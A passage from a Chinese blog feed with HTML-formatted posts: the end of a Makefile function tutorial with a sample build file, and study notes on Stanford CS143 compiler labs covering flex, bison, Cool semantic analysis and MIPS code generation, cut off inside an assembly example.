<li>格式：$(basename <code>&lt;names...&gt;</code>)</li>
<li>功能：从文件名序列中取出各个文件名的前缀部分（除去扩展名后的剩余部分）</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Variable := $(basename src/foo.c src-1.0/bar.c hacks)</span><br><span class="line"><span class="comment"># Variable ==&gt; src/foo src-1.0/bar hacks</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>notdir</code></p>
<ul>
<li>格式：$(notdir <code>&lt;names...&gt;</code>)</li>
<li>功能：文件名列表中去除所有的目录信息，只保留文件名</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 去除所有的目录信息，返回的文件名列表将只有文件名</span></span><br><span class="line">SRC = $(notdir wildcard)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>shell</code></p>
<ul>
<li>功能：执行shell命令<code>&lt;myCommand&gt;</code>并返回输出结果</li>
<li>格式：$(shell <code>&lt;myCommand&gt;</code>)</li>
</ul>
<blockquote>
<p>注：每行的shell都是一个单独的进程</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CXXFLAGS := $(shell llvm-config --cxxflags)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>subst</code></p>
<ul>
<li>功能：把字符串<code>&lt;text&gt;</code>中的<code>&lt;from&gt;</code>字符串替换成<code>&lt;to&gt;</code></li>
<li>格式：$(subst <code>&lt;from&gt;</code>,<code>&lt;to&gt;</code>,<code>&lt;text&gt;</code>)</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 注：无需引号</span></span><br><span class="line">Origin := There is a big tree</span><br><span class="line">Result := $(subst a,the, $(Origin))</span><br><span class="line"><span class="comment"># Result ==&gt; There is the big tree</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>wildcard</code></p>
<blockquote>
<p>在Makefile规则中，通配符会被自动展开。但在变量的定义和函数引用时，通配符将失效。</p>
</blockquote>
<ul>
<li>功能：函数引用时使通配符有效</li>
<li>格式：$(wildcard <code>&lt;PATTERN...&gt;</code>)</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 生成一个以空格间隔的后缀为.c的文件名列表</span></span><br><span class="line">Variable := $(wildcard *.c)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="4-简单的例子">4. 简单的例子</h2>
<p>命令行输入<code>make &lt;targetFile&gt;</code>即可对特定目标文件进行编译。</p>
<blockquote>
<p>例：make all、make main、make clean(clean比较特殊)</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#获取.cpp文件</span></span><br><span class="line">SrcFiles=$(wildcard *.cpp)</span><br><span class="line"><span class="comment">#使用替换函数获取.o文件</span></span><br><span class="line">ObjFiles=$(patsubst %.cpp,%.o,$(SrcFiles))</span><br><span class="line"><span class="comment">#生成的可执行文件</span></span><br><span class="line">all:main</span><br><span class="line"><span class="comment">#目标文件依赖于.o文件</span></span><br><span class="line">main:$(ObjFiles)</span><br><span class="line">  g++ -o <span class="variable">$@</span> -I ../include $(SrcFiles)</span><br><span class="line"><span class="comment">#.o文件依赖于.cpp文件，通配使用，一条就够</span></span><br><span class="line">%.o:%.cpp</span><br><span class="line">  g++ -c -I ../include $&lt;</span><br><span class="line"></span><br><span class="line">.PHONY:clean all</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">  rm -f *.o</span><br><span class="line">  rm -f main</span><br></pre></td></tr></table></figure>
<h2 id="5-参考">5. 参考</h2>
<ul>
<li><a href="https://www.cnblogs.com/love-jelly-pig/p/10040578.html" target="_blank" rel="noopener">Makefile简单编写实例</a></li>
<li><a href="https://blog.csdn.net/b876144622/article/details/80372161" target="_blank" rel="noopener">Makefile 中:= ?= += =的区别</a></li>
<li><a href="https://blog.csdn.net/xiaowanbiao123/article/details/78274425" target="_blank" rel="noopener">makefile的内置函数</a></li>
</ul>
]]></content>
      <tags>
        <tag>makefile</tag>
      </tags>
  </entry>
  <entry>
    <title>编译原理</title>
    <url>/2020/06/compiler-learning/</url>
    <content><![CDATA[<p>个人CS143 Lab源码仓库 - <a href="https://github.com/Kiprey/Skr_Learning/tree/master/week3-4" target="_blank" rel="noopener">github</a></p>
<h2 id="简介">简介</h2>
<p>这次学习编译原理所使用的课程是Stanford的CS143编译原理课程，其中配套了Program Assignment Lab</p>
<a id="more"></a>
<h2 id="1-lexer-词法分析">1. lexer - 词法分析</h2>
<ul>
<li>
<p>编写相应的词法分析器<code>flex</code>脚本，就可以输出一个对应的C++源码，将之编译即可得到lexer</p>
</li>
<li>
<p><code>flex</code>脚本中，我们主要编写的是正则表达式的匹配规则，匹配对应的字符串，返回一个个的<code>token</code>。</p>
</li>
<li>
<p>lexer通过正则语法，将对应读入的词转换为一个个的<code>token</code></p>
</li>
<li>
<p>在词法分析这个过程中，可以过滤出比较明显的错误，例如</p>
<ul>
<li>引号、注释符的闭合</li>
<li>非源码中可以出现的字符，比如<code>ASCII &lt; 32</code>的各种控制符号以及特殊的转义字符等等</li>
<li>过长的字符串</li>
<li>不在规定范围内的转义字符，例如<code>\\</code>转义反斜杠不该出现在字符串双引号之外</li>
<li>以及其他的通过读取字符就可以找到的各种简单错误</li>
</ul>
</li>
<li>
<p>一个简单的例子</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 编写正则表达式 */</span></span><br><span class="line">DIGIT     [<span class="number">0</span><span class="number">-9</span>]</span><br><span class="line">LETTER    [a-zA-Z]</span><br><span class="line">ID        (&#123;LETTER&#125;|&#123;DIGIT&#125;|_)</span><br><span class="line">TYPEID    [A-Z]&#123;ID&#125;*</span><br><span class="line"><span class="comment">/* 匹配到对应的符号则执行方括号内的操作 */</span></span><br><span class="line">&#123;TYPEID&#125; &#123;</span><br><span class="line">  <span class="comment">/* 将当前识别到的typeid添加进字符表中，使其不添加重复字符串 */</span></span><br><span class="line">  cool_yylval.symbol = idtable.add_string(yytext);</span><br><span class="line">  <span class="comment">/* 将当前识别到的token返回 */</span></span><br><span class="line">  <span class="keyword">return</span> TYPEID;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>正则表达式的规则很容易理解，但是正则表达式并不能直接用来解析字符串，所以还要引入一种适合转化为计算机程序的模型 —— <strong>有穷自动机</strong>(finite automation，FA)</p>
<blockquote>
<p>flex的核心就是自动机。</p>
</blockquote>
<ul>
<li>有穷自动机首先包含一个有限状态的集合，还包含了从一个状态到另外一个状态的转换。有穷自动机看上去就像是一个有向图，其中状态是图的节点，而状态转换则是图的边。此外这些状态中还必须有一个初始状态和至少一个接受状态。</li>
<li>有穷自动机处理输入字符串的流程
<ul>
<li>初始情况下，自动机处于初始状态</li>
<li>读取字符串的第一个字符，这时自动机会查询当前状态上与输入字符相匹配的边，并沿这条边转换到下一个状态。</li>
<li>继续输入下一个字符，重复第二步，查询当前状态上的边并进行状态转换。</li>
<li>当字符串全部输入后，如果自动机正好处于接受状态上，就说该自动机 <strong>接受了这一字符串</strong>。</li>
</ul>
</li>
<li>有穷自动机分为两种
<ul>
<li>确定性有穷自动机（DFA）。特点：从每一个状态只能发出一条具有某个符号的边 —— 不能出现同一个符号出现在同一状态发出的两条边上。</li>
<li>非确定性有穷自动机(NFA)。 特点：允许从一个状态发出多条具有相同符号的边，甚至允许发出标有ε（表示空）符号的边，即NFA可以不输入任何字符就自动沿ε边转换到下一个状态。
<blockquote>
<p>NFA与DFA <strong>等价</strong>，且NFA 可以转化为 DFA</p>
</blockquote>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>flex所生成的代码，其大致流程为：</p>
<ul>
<li>初始化相关内存与状态</li>
<li>从上一次读取的位置开始，循环读取单个字节，并根据<code>yy_nxt</code>状态表与<code>yy_current_state</code>当前状态，跳转至下一个状态</li>
<li>待无法跳转至下一个状态时（即匹配完成或出错），根据当前状态，在<code>yy_accept</code>动作表中确定<code>yy_act</code>动作</li>
<li>根据<code>yy_act</code>执行特定操作（用户定义的操作或异常捕获）</li>
</ul>
<blockquote>
<p>注：状态表等是自动机中的重中之重。</p>
</blockquote>
</li>
<li>
<p>参考</p>
<ul>
<li><a href="http://eternalsakura13.com/2020/05/27/flex/" target="_blank" rel="noopener">flex中文文档</a></li>
<li><a href="https://blog.csdn.net/qq_39521554/article/details/79416553" target="_blank" rel="noopener">编译原理：有穷自动机（DFA与NFA）</a></li>
<li><strong>偏向代码分析</strong> 的 <a href="https://happyers.top/uncategorized/understanding-c-lexer-generated-by-flex/" target="_blank" rel="noopener">flex生成代码分析</a> - <a href="https://github.com/pcy190/CompilerAnalysis/blob/master/flex_analysis.md" target="_blank" rel="noopener">github</a></li>
</ul>
</li>
</ul>
<h2 id="2-parser-语法分析">2. parser - 语法分析</h2>
<ul>
<li>
<p>parser，一般是指把某种格式的文本（字符串）转换成某种数据结构的过程。</p>
<blockquote>
<p>之所以需要做这种从字符串到数据结构的转换，是因为编译器是无法直接操作“1+2”这样的字符串的。<br>
实际上，代码的本质根本就不是字符串，它本来就是一个具有复杂拓扑的数据结构</p>
</blockquote>
<p>对于程序语言，这种解码的动作就叫做 parsing，用于解码的那段代码就叫做 parser</p>
</li>
<li>
<p>语法分析所使用的工具通常是<code>bison</code>，<code>bison</code>与<code>flex</code>类似，核心都是 <strong>自动机</strong>，但其处理方式又有所不同。</p>
</li>
<li>
<p><code>bison</code>所使用的是自底向上，左递归的分析方式。</p>
</li>
<li>
<p>在语法分析这个过程中，可以过滤出一些不符合语法的错误，例如token排列不符合条件，无法规约。<br>
在这种情况下必须进行错误处理程序，将token弹出栈（或者其他操作）。</p>
</li>
<li>
<p>语法分析所得到的结果是一个AST抽象语法分析树。它只是一个由Token简单组合起来的树，仍然需要二次处理。</p>
</li>
<li>
<p>一个简单的例子</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* If no parent is specified, the class inherits from the Object class. */</span></span><br><span class="line"><span class="comment">/* 定义：以下token规约后的符号名称为"class" */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> :</span></span><br><span class="line">  <span class="comment">/* 若当前栈中的token满足下面这条式子 */</span></span><br><span class="line">  CLASS TYPEID <span class="string">'&#123;'</span> dummy_feature_list <span class="string">'&#125;'</span> <span class="string">';'</span> <span class="comment">/* ' */</span></span><br><span class="line">    <span class="comment">/* 进行规约。在规约的同时执行以下这条式子 */</span></span><br><span class="line">    <span class="comment">/* 注意，赋给$$的值，就是规约后新生成"class"的值 */</span></span><br><span class="line">    &#123; $$ = class_($<span class="number">2</span>,idtable.add_string(<span class="string">"Object"</span>), $<span class="number">4</span>, stringtable.add_string(curr_filename)); &#125;</span><br><span class="line">  | <span class="comment">/* 或者，如果满足以下式子 */</span></span><br><span class="line">  CLASS TYPEID INHERITS TYPEID <span class="string">'&#123;'</span> dummy_feature_list <span class="string">'&#125;'</span> <span class="string">';'</span></span><br><span class="line">    &#123; $$ = class_($<span class="number">2</span>,$<span class="number">4</span>,$<span class="number">6</span>,stringtable.add_string(curr_filename)); &#125;</span><br><span class="line">  | <span class="comment">/* 或者，如果捕获到了错误 */</span></span><br><span class="line">  error <span class="string">';'</span></span><br><span class="line">    &#123;&#125;</span><br><span class="line">;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>参考</p>
<ul>
<li><strong>偏向状态表分析</strong> <a href="https://happyers.top/compiler/bison-parser/" target="_blank" rel="noopener">bison生成代码的分析</a> - <a href="https://github.com/pcy190/CompilerAnalysis/blob/master/bison_analysis.md" target="_blank" rel="noopener">github</a></li>
<li><a href="http://www.yinwang.org/blog-cn/2015/09/19/parser" target="_blank" rel="noopener">对Parser的误解</a></li>
</ul>
</li>
</ul>
<h2 id="3-semant-语义分析">3. semant - 语义分析</h2>
<ul>
<li>语义分析要对语法分析所生成的不全面的AST进行二次处理，并捕获 <strong>所有</strong> 剩余的错误。</li>
<li>在语义分析中，必须填补缺失的信息，例如每个节点的类型。</li>
<li>在此过程中，所捕获的错误包括但不限于
<ul>
<li>类型不匹配</li>
<li>变量名未定义</li>
<li>类继承成环状关系</li>
</ul>
</li>
<li>以cool语言为例，该语言的语义分析需要经过以下步骤
<ul>
<li>
<p>将基础类（<code>Object</code>，<code>IO</code>，<code>String</code>，<code>Bool</code>），添加至classTable中</p>
</li>
<li>
<p>将用户定义的类，添加进classTable中</p>
</li>
<li>
<p>检查是否有不正确的类继承。即检查是否存在某个类继承了一个 <strong>未声明或无法被继承</strong> 的类等等。</p>
</li>
<li>
<p>将所有类按照继承关系建立 <strong>继承树</strong> 。例如：</p>
<pre class="mermaid">    graph TB;
Object --> String;
Object --> Int;
Object --> IO
Object --> Bool
Object --> A
IO --> B
C --> D
D --> E
E --> C</pre>
<p><code>InheritanceNode</code>是类继承的基本单元。每个<code>InheritanceNode</code>都和一个cool语言中的类绑定。同时每个<code>InheritanceNode</code>中都存在一个指向<code>Environment</code>的指针成员。</p>
</li>
<li>
<p>从根类（即从<code>Object</code>类）开始，自顶向下递归设置<code>InheritanceNode</code>为 <strong>“可到达的”</strong>。</p>
</li>
<li>
<p>遍历全部类，判断是否有<code>InheritanceNode</code>是 <strong>“不可到达的”</strong> 。 如果存在，则说明类继承关系中存在环，报错终止。（例如上图）</p>
<blockquote>
<p>注意：由于cool语言是单继承的，每个类都只能继承一个类。所以这种判断是可行的。</p>
</blockquote>
</li>
<li>
<p>递归建立<code>feature_table</code>。从 <strong>继承树</strong> 的根开始（即<code>Object</code>类），自顶向下递归建立每个<code>InheritanceNode</code>中<code>Environment</code>的<code>feature_table</code>。该操作会将cool语言中，每个类内的<code>attribute</code>和<code>method</code>均添加进表中。<br>
当父节点的<code>feature_table</code>建立完成后，子节点便会复制父节点的<code>Environment</code>，并在其上进行添加操作。这样，父节点的属性自然就包含于子节点的属性中。</p>
</li>
<li>
<p>检查是否存在<code>Main</code>类以及<code>main</code>方法。</p>
</li>
<li>
<p>递归进行类型检查。从 <strong>继承树</strong> 的根开始，<strong>自顶向下</strong> 检查每个类的类型，检查是错误，以及为AST添加缺失的类型信息。<br>
在每个类中，类型检查是 <strong>自底向上</strong> 的，由节点较低的类型生成节点较高的类型，如此反复直至树根。其中需要捕获大量的错误，以及正确处理变量的作用域等等。</p>
</li>
<li>
<p>语义分析结束，输出完整的AST。</p>
</li>
</ul>
</li>
<li>语义分析的功能，归根到底就只有两点
<ul>
<li>捕获所有错误。</li>
<li>补充AST缺失的信息。</li>
</ul>
</li>
<li>语义分析需要对每个表达式都进行类型检查，所以类型检查代码的编写是十分重要的。每个表达式所确定的类型也必须严格按照对应编程语言手册里的相关规定来设计，不可随意更改。</li>
</ul>
<h2 id="4-Code-optimization-代码优化">4. Code optimization - 代码优化</h2>
<p>请移步  <a href="/2020/06/LLVM-IR-pass/">代码优化与LLVM IR pass</a></p>
<h2 id="5-cgen-目标代码生成">5. cgen - 目标代码生成</h2>
<ul>
<li>
<p>以cool语言为例，在生成目标代码前，需要先读入AST树的相关信息，重建继承图，并自上而下的初始化相关的映射表格<br>
在该初始化过程中，每个类会遍历其中的<code>feature</code>，并将其相关信息添加至对应的<code>SymbolTable</code>中<br>
如果该<code>feature</code>是<code>method</code>，则还会额外自顶向下计算所需要的最小临时变量数量，并将其添加进表格中。</p>
</li>
<li>
<p>初始化过后就是生成代码，这个步骤会执行以下几个过程：</p>
<ul>
<li>
<p>声明全局变量。例如以下mips汇编代码：</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">  <span class="meta">.data</span></span><br><span class="line">  <span class="meta">.align</span>  <span class="number">2</span></span><br><span class="line">  .globl  class_nameTab</span><br><span class="line">  .globl  Main_protObj</span><br><span class="line">  .globl  Int_protObj</span><br><span class="line">  .globl  String_protObj</span><br><span class="line">  .globl  <span class="keyword">bool_const0</span></span><br><span class="line"><span class="keyword"> </span> .globl  <span class="keyword">bool_const1</span></span><br><span class="line"><span class="keyword"> </span> .globl  _int_tag</span><br><span class="line">  .globl  _bool_tag</span><br><span class="line">  .globl  _string_tag</span><br><span class="line"></span><br><span class="line"><span class="symbol">_int_tag:</span></span><br><span class="line">  <span class="meta">.word</span> <span class="number">3</span></span><br><span class="line"><span class="symbol">_bool_tag:</span></span><br><span class="line">  <span class="meta">.word</span> <span class="number">4</span></span><br><span class="line"><span class="symbol">_string_tag:</span></span><br><span class="line">  <span class="meta">.word</span> <span class="number">5</span></span><br><span class="line">  .globl _MemMgr_INITIALIZER</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>声明GC器。例如以下汇编代码：</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">_MemMgr_INITIALIZER:</span></span><br><span class="line">  <span class="meta">.word</span> _NoGC_Init</span><br><span class="line">  .globl _MemMgr_COLLECTOR</span><br><span class="line"><span class="symbol">_MemMgr_COLLECTOR:</span></span><br><span class="line">  <span class="meta">.word</span> _NoGC_Collect</span><br><span class="line">  .globl _MemMgr_TEST</span><br><span class="line"><span class="symbol">_MemMgr_TEST:</span></span><br><span class="line">  <span class="meta">.word</span> <span class="number">0</span></span><br><span class="line">  <span class="meta">.word</span> -<span class="number">1</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>将常量输出（例如：数字，字符串，布尔常量），例如以下部分汇编代码</p>
<blockquote>
<p>注意：数字常量包括<code>0</code>，字符串常量包括空字符串<code>&quot;&quot;</code></p>
</blockquote>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">  <span class="meta">.word</span> -<span class="number">1</span>              <span class="comment"># eye catcher for _gc_check</span></span><br><span class="line"><span class="symbol">str_const8:</span>             <span class="comment"># 该字符串的标签</span></span><br><span class="line">  <span class="meta">.word</span> <span class="number">5</span>               <span class="comment"># （未知用途）</span></span><br><span class="line">  <span class="meta">.word</span> <span class="number">6</span>               <span class="comment"># （未知用途）</span></span><br><span class="line">  <span class="meta">.word</span> String_dispTab  <span class="comment"># 该类型可以使用的方法</span></span><br><span class="line">  <span class="meta">.word</span> int_const2      <span class="comment"># 字符串长度（其中的int_const2指向另一个数字常量）</span></span><br><span class="line">  <span class="meta">.ascii</span> <span class="string">"Main"</span>         <span class="comment"># 字符串的ASCII码</span></span><br><span class="line">  .<span class="keyword">byte </span><span class="number">0</span>               <span class="comment"># 字符串末尾的\0终结符</span></span><br><span class="line">  <span class="meta">.align</span> <span class="number">2</span>              <span class="comment"># 对齐</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>将所有类的名称输出。例如以下汇编代码：</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">class_nameTab:</span>        <span class="comment"># 这一个个的str_const都指向特定的字符串</span></span><br><span class="line">  <span class="meta">.word</span> str_const6    <span class="comment"># str_const6  =&gt; "Object"</span></span><br><span class="line">  <span class="meta">.word</span> str_const7    <span class="comment"># str_const7  =&gt; "IO"</span></span><br><span class="line">  <span class="meta">.word</span> str_const8    <span class="comment"># str_const8  =&gt; "Main"</span></span><br><span class="line">  <span class="meta">.word</span> str_const9    <span class="comment"># str_const9  =&gt; "Int"</span></span><br><span class="line">  <span class="meta">.word</span> str_const10   <span class="comment"># str_const10 =&gt; "Bool"</span></span><br><span class="line">  <span class="meta">.word</span> str_const11   <span class="comment"># str_const11 =&gt; "String"</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>将所有类中的object table输出（未知用途，删除后仍然可以执行）</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">class_objTab:</span></span><br><span class="line">  <span class="meta">.word</span>  Object_protObj</span><br><span class="line">  <span class="meta">.word</span>  Object_init</span><br><span class="line">  <span class="meta">.word</span>  IO_protObj</span><br><span class="line">  <span class="meta">.word</span>  IO_init</span><br><span class="line">  <span class="meta">.word</span>  Main_protObj</span><br><span class="line">  <span class="meta">.word</span>  Main_init</span><br><span class="line">  <span class="meta">.word</span>  Int_protObj</span><br><span class="line">  <span class="meta">.word</span>  Int_init</span><br><span class="line">  <span class="meta">.word</span>  <span class="keyword">Bool_protObj</span></span><br><span class="line"><span class="keyword"> </span> <span class="meta">.word</span>  <span class="keyword">Bool_init</span></span><br><span class="line"><span class="keyword"> </span> <span class="meta">.word</span>  String_protObj</span><br><span class="line">  <span class="meta">.word</span>  String_init</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>将每个类所含的方法输出（包括该类的继承类中的方法），例如以下汇编代码</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Main_dispTab:</span></span><br><span class="line">  <span class="meta">.word</span>  Object.abort</span><br><span class="line">  <span class="meta">.word</span>  Object.type_name</span><br><span class="line">  <span class="meta">.word</span>  Object.copy</span><br><span class="line">  <span class="meta">.word</span>  IO.out_string</span><br><span class="line">  <span class="meta">.word</span>  IO.out_int</span><br><span class="line">  <span class="meta">.word</span>  IO.in_string</span><br><span class="line">  <span class="meta">.word</span>  IO.in_int</span><br><span class="line">  <span class="meta">.word</span>  Main.main</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>将每个类的类型信息输出。<code>protObj</code>中含有当前类的属性以及函数表。例如以下部分汇编代码</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">    <span class="meta">.word</span>  -<span class="number">1</span>         <span class="comment"># -1 header for the garbage collector(eye catcher for _gc_check)</span></span><br><span class="line"><span class="symbol">Main_protObj:</span>         <span class="comment"># label</span></span><br><span class="line">  <span class="meta">.word</span>  <span class="number">2</span>            <span class="comment"># class tag</span></span><br><span class="line">  <span class="meta">.word</span>  <span class="number">7</span>            <span class="comment"># total_attributes + DEFAULT_OBJFIELDS</span></span><br><span class="line">  <span class="meta">.word</span>  Main_dispTab <span class="comment"># 函数表</span></span><br><span class="line">  <span class="meta">.word</span>  int_const0   <span class="comment"># 第一个attribute是数字类型</span></span><br><span class="line">  <span class="meta">.word</span>  str_const12  <span class="comment"># 第二个attribute是字符串类型</span></span><br><span class="line">  <span class="meta">.word</span>  <span class="keyword">bool_const0 </span> <span class="comment"># 第三个attribute是布尔类型</span></span><br><span class="line">  <span class="meta">.word</span>  <span class="number">0</span>            <span class="comment"># 第四个attribute是其他类型，例如各种类</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>声明全局代码段的相关信息，例如以下汇编代码</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="comment">#声明堆的相关信息</span></span><br><span class="line">  .globl  heap_start</span><br><span class="line"><span class="symbol">heap_start:</span></span><br><span class="line">  <span class="meta">.word</span>  <span class="number">0</span></span><br><span class="line"><span class="comment">#声明text代码段</span></span><br><span class="line">  <span class="meta">.text</span></span><br><span class="line">  .globl  Main_init</span><br><span class="line">  .globl  Int_init</span><br><span class="line">  .globl  String_init</span><br><span class="line">  .globl  <span class="keyword">Bool_init</span></span><br><span class="line"><span class="keyword"> </span> .globl  Main.main</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>输出每个类的初始化函数的代码，例如以下汇编代码</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">String_init:</span></span><br><span class="line">  <span class="keyword">addiu </span> $<span class="built_in">sp</span> $<span class="built_in">sp</span> -<span class="number">12</span></span><br><span class="line">  <span class="keyword">sw </span> $<span class="built_in">fp</span> <span class="number">12</span>($<span class="built_in">sp</span>)</span><br><span class="line">  <span class="keyword">sw </span> $<span class="built_in">s0</span> <span class="number">8</span>($<span class="built_in">sp</span>)</span><br><span class="line">  <span class="keyword">sw </span> $<span class="built_in">ra</span> <span class="number">4</span>($<span class="built_in">sp</span>)</span><br><span class="line">  <span class="keyword">addiu </span> $<span class="built_in">fp</span> $<span class="built_in">sp</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">move </span> $<span class="built_in">s0</span> $<span class="built_in">a0</span></span><br><span class="line">  <span class="keyword">jal </span> Object_init</span><br><span class="line">  <span class="keyword">move </span> $<span class="built_in">a0</span> $<span class="built_in">s0</span></span><br><span class="line">  <span class="keyword">lw </span> $<span class="built_in">fp</span> <span class="number">12</span>($<span class="built_in">sp</span>)</span><br><span class="line">  <span class="keyword">lw </span> $<span class="built_in">s0</span> <span class="number">8</span>($<span class="built_in">sp</span>)</span><br><span class="line">  <span class="keyword">lw </span> $<span class="built_in">ra</span> <span class="number">4</span>($<span class="built_in">sp</span>)</span><br><span class="line">  <span class="keyword">addiu </span> $<span class="built_in">sp</span> $<span class="built_in">sp</span> <span class="number">12</span></span><br><span class="line">  <span class="keyword">jr </span> $<span class="built_in">ra</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong>输出每个类中的函数代码</strong>（示例代码就不放出来了）</p>
</li>
</ul>
</li>
<li>
<p>在给出的课程文件夹中，文件<code>trap.handler</code>是一个不可或缺的存在。相当一部分重要函数被定义在其中，例如<code>out_string</code>以及垃圾回收器<code>GC</code>  等等。<br>
mips汇编的执行流程如下：</p>
<ul>
<li>首先执行<code>__start</code></li>
<li>在<code>__start</code>中，初始化垃圾回收器<code>GC</code></li>
<li>设置<code>_exception_handler</code>异常处理程序</li>
<li>复制一份<code>Main</code>类，并将其保存至栈上</li>
<li>调用<code>Main.init</code>进行初始化</li>
<li>执行<code>Main.main</code></li>
<li>待函数返回后恢复栈</li>
<li>输出终止信息并调用<code>exit</code>退出</li>
</ul>
<p>所以在生成main函数的代码时，不需要额外调用<code>abort</code>，只要将其视为一个普通的函数调用就好。</p>
<blockquote>
<p><code>trap.handler</code>中的函数，其参数传递方式为寄存器传递，与约定俗成的压栈传递有所不同，在阅读源码时注意甄别。</p>
</blockquote>
</li>
<li>
<p>在生成的mips汇编代码中，当调用另一个函数时，程序会</p>
<ul>
<li>待调用函数的参数全部压栈</li>
<li>加载 <strong>当前类</strong> 的<code>dispatch_table</code></li>
<li>加上某个特定偏移</li>
<li>得到待调用函数的具体位置</li>
<li><code>jalr</code>无条件跳转</li>
</ul>
</li>
<li>
<p>在mips汇编代码中，当调用new时，会执行以下流程</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">la  $<span class="built_in">a0</span> IO_protObj  <span class="comment"># 将待生成对象的静态地址赋给$a0</span></span><br><span class="line"><span class="keyword">jal </span>Object.copy     <span class="comment"># 调用copy复制一份到堆内存中（参数：$a0指向待复制的类对象；返回：$a0指向堆内存中复制出的类对象）</span></span><br><span class="line"><span class="keyword">jal </span>IO_init         <span class="comment"># 调用init方法初始化（参数：$a0指向复制出的类对象</span></span><br></pre></td></tr></table></figure>
<p>即，整个过程结束时，<code>$a0</code>指向新建的类对象</p>
</li>
<li>
<p><code>self</code>指针（<code>$s0</code>）的改变过程</p>
<ul>
<li>当<code>Main</code>类被新建出来后，<code>$a0</code>便指向堆上所复制出<code>Main</code>类的地址</li>
<li>执行<code>Main.init</code>初始化（参数<code>$a0</code>指向堆上复制出的类）。之后执行<code>Main.main</code>函数。</li>
<li>在每个函数开头，<code>$a0</code>都存放当前函数所属类的地址。故我们可以认定，<code>$a0</code>是类成员函数的隐藏参数，与C++类中的<code>this</code>指针类似，都是指向此函数所属的类。</li>
<li>在每个成员函数中，
<ul>
<li>
<p>函数开始时，<code>$s0</code>会先将上一个类地址存进栈中，然后将当前类地址<code>$a0</code>赋给<code>$s0</code>，使<code>$s0</code>指向新类的地址。</p>
<blockquote>
<p>为什么要将<code>self</code>放至<code>callee save</code>的寄存器中呢？请看下述代码：</p>
</blockquote>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">  func() : Object &#123;&#123;</span><br><span class="line">    <span class="number">1</span>;</span><br><span class="line">  &#125;&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">  main():Object &#123;&#123;</span><br><span class="line">        (<span class="keyword">new</span> A).func();</span><br><span class="line">  &#125;&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>当执行<code>A.func</code>函数时，其<code>old $s0</code>指向<code>Main</code>类，而传入的<code>$a0</code>指向<code>A</code>类。所以<code>$s0</code>需要在函数中保存。</p>
</blockquote>
</li>
<li>
<p>之后<code>$a0</code>便作为中间寄存器，参与当前函数中的表达式计算过程。</p>
</li>
<li>
<p>在当前函数中调用函数，则会取得<code>$s0</code>的相对偏移处的类函数表<code>dispatch_table</code>，并根据特定偏移取得待调用函数的地址。若是取当前类中的成员变量，则同样使用<code>$s0</code>取得<code>protObj</code>中的成员信息。</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Main_protObj:</span></span><br><span class="line">  <span class="meta">.word</span> <span class="number">2</span></span><br><span class="line">  <span class="meta">.word</span> <span class="number">4</span></span><br><span class="line">  <span class="meta">.word</span> Main_dispTab      <span class="comment"># 函数表，offset = 8</span></span><br><span class="line">  <span class="meta">.word</span> int_const2        <span class="comment"># main中的一个成员变量，offset = 12</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">Main_dispTab:</span></span><br><span class="line">  <span class="meta">.word</span> Object.abort</span><br><span class="line">  <span class="meta">.word</span> Object.type_name</span><br><span class="line">  <span class="meta">.word</span> Object.copy</span><br><span class="line">  <span class="meta">.word</span> IO.out_string</span><br><span class="line">  <span class="meta">.word</span> IO.out_int        <span class="comment"># 函数out_int，offset = 16</span></span><br><span class="line">  <span class="meta">.word</span> IO.in_string</span><br><span class="line">  <span class="meta">.word</span> IO.in_int</span><br><span class="line">  <span class="meta">.word</span> Main.main</span><br><span class="line"></span><br><span class="line"><span 